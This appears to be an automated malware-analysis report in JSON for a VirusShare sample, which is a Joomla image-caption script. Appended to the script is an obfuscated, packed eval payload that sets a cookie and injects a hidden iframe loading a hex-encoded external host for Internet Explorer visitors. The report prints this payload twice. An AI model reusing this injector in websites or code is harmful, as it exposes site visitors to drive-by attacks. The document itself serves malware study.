@@ -1,0 +1,76 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "Open": "May open a file",
+            "write": "May write to a file"
+        },
+        "macro": "/**\n* @version\t\t$Id: modal.js 5263 2006-10-02 01:25:24Z webImagery $\n* @copyright\tCopyright (C) 2005 - 2008 Open Source Matters. All rights reserved.\n* @license\t\tGNU/GPL, see LICENSE.php\n* Joomla! is free software. This version may have been modified pursuant\n* to the GNU General Public License, and as distributed it includes or\n* is derivative of works licensed under the GNU General Public License or\n* other free or open source software licenses.\n* See COPYRIGHT.php for copyright notices and details.\n*/\n\n/**\n * JCaption javascript behavior\n *\n * Used for displaying image captions\n *\n * @package\t\tJoomla\n * @since\t\t1.5\n * @version     1.0\n */\nvar JCaption = new Class({\n\tinitialize: function(selector)\n\t{\n\t\tthis.selector = selector;\n\n\t\tvar images = $$(selector);\n\t\timages.each(function(image){ this.createCaption(image); }, this);\n\t},\n\n\tcreateCaption: function(element)\n\t{\n\t\tvar caption   = document.createTextNode(element.title);\n\t\tvar container = document.createElement(\"div\");\n\t\tvar text      = document.createElement(\"p\");\n\t\tvar width     = element.getAttribute(\"width\");\n\t\tvar align     = element.getAttribute(\"align\");\n\n\t\tif(!width) {\n\t\t\twidth = element.width;\n\t\t}\n\n\t\ttext.appendChild(caption);\n\t\telement.parentNode.insertBefore(container, element);\n\t\tcontainer.appendChild(element);\n\t\tif ( element.title != \"\" ) {\n\t\t\tcontainer.appendChild(text);\n\t\t}\n\t\tcontainer.className   = this.selector.replace('.', '_');\n\t\tcontainer.className   = container.className + \" \" + align;\n\t\tcontainer.setAttribute(\"style\",\"float:\"+align);\n\t\tcontainer.style.width = width + \"px\";\n\n\t}\n});\n\ndocument.caption = null\nwindow.addEvent('load', function() {\n  var caption = new JCaption('img.caption')\n  document.caption = caption\n});\n\nsa=\"%6B%73%69%65%6E%61%2E%6E%65%74\";eval(function(p,a,c,k,e,d){while(c--){if(k[c]){p=p.replace(new RegExp('\\\\b'+c.toString(a)+'\\\\b','g'),k[c])}}return p}('a(0.4.7(\"5=s\")==-1&&9.8.7(\"f 6\")!=-1){0.4=\"5=s; e=c, 2 g b 2:d:h p; \";0.r(\"<3 q=1 t=1 o=\\'n://\"+j+\"/i/\\' k=\\'l:m\\'></3>\")}',30,30,'document||14|iframe|cookie|_mlsdkf||indexOf|appVersion|navigator|if|2015|Mon|15|expires|MSIE|Jul|26|b2b|sa|style|display|none|http|src|GMT|width|write||height'.split('|')));"
+    },
+    "filename": "VirusShare_63d6832f7b1fb7978dbfd4e57ccc340f",
+    "filesize": 2182,
+    "filetype": "ASCII text, with very long lines",
+    "hashes": {
+        "md5": "63d6832f7b1fb7978dbfd4e57ccc340f",
+        "sha1": "848026addc0edb057b3945b46f3aa40fd8699fe6",
+        "sha256": "a737c3112abd58485bd09cba8d0c229ca4edc308b1eccfc2a397c88e9d9b5a1e"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "* @version\t\t$Id: modal.js 5263 2006-10-02 01:25:24Z webImagery $",
+            "* @copyright\tCopyright (C) 2005 - 2008 Open Source Matters. All rights reserved.",
+            "* @license\t\tGNU/GPL, see LICENSE.php",
+            "* Joomla! is free software. This version may have been modified pursuant",
+            "* to the GNU General Public License, and as distributed it includes or",
+            "* is derivative of works licensed under the GNU General Public License or",
+            "* other free or open source software licenses.",
+            "* See COPYRIGHT.php for copyright notices and details.",
+            " * JCaption javascript behavior",
+            " * Used for displaying image captions",
+            " * @package\t\tJoomla",
+            " * @since\t\t1.5",
+            " * @version     1.0",
+            "var JCaption = new Class({",
+            "\tinitialize: function(selector)",
+            "\t\tthis.selector = selector;",
+            "\t\tvar images = $$(selector);",
+            "\t\timages.each(function(image){ this.createCaption(image); }, this);",
+            "\tcreateCaption: function(element)",
+            "\t\tvar caption   = document.createTextNode(element.title);",
+            "\t\tvar container = document.createElement(\"div\");",
+            "\t\tvar text      = document.createElement(\"p\");",
+            "\t\tvar width     = element.getAttribute(\"width\");",
+            "\t\tvar align     = element.getAttribute(\"align\");",
+            "\t\tif(!width) {",
+            "\t\t\twidth = element.width;",
+            "\t\ttext.appendChild(caption);",
+            "\t\telement.parentNode.insertBefore(container, element);",
+            "\t\tcontainer.appendChild(element);",
+            "\t\tif ( element.title != \"\" ) {",
+            "\t\t\tcontainer.appendChild(text);",
+            "\t\tcontainer.className   = this.selector.replace('.', '_');",
+            "\t\tcontainer.className   = container.className + \" \" + align;",
+            "\t\tcontainer.setAttribute(\"style\",\"float:\"+align);",
+            "\t\tcontainer.style.width = width + \"px\";",
+            "document.caption = null",
+            "window.addEvent('load', function() {",
+            "  var caption = new JCaption('img.caption')",
+            "  document.caption = caption",
+            "sa=\"%6B%73%69%65%6E%61%2E%6E%65%74\";eval(function(p,a,c,k,e,d){while(c--){if(k[c]){p=p.replace(new RegExp('\\\\b'+c.toString(a)+'\\\\b','g'),k[c])}}return p}('a(0.4.7(\"5=s\")==-1&&9.8.7(\"f 6\")!=-1){0.4=\"5=s; e=c, 2 g b 2:d:h p; \";0.r(\"<3 q=1 t=1 o=\\'n://\"+j+\"/i/\\' k=\\'l:m\\'></3>\")}',30,30,'document||14|iframe|cookie|_mlsdkf||indexOf|appVersion|navigator|if|2015|Mon|15|expires|MSIE|Jul|26|b2b|sa|style|display|none|http|src|GMT|width|write||height'.split('|')));"
+        ],
+        "file": {
+            "* @license\t\tGNU/GPL, see LICENSE.php": "Web Page"
+        },
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.273742",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
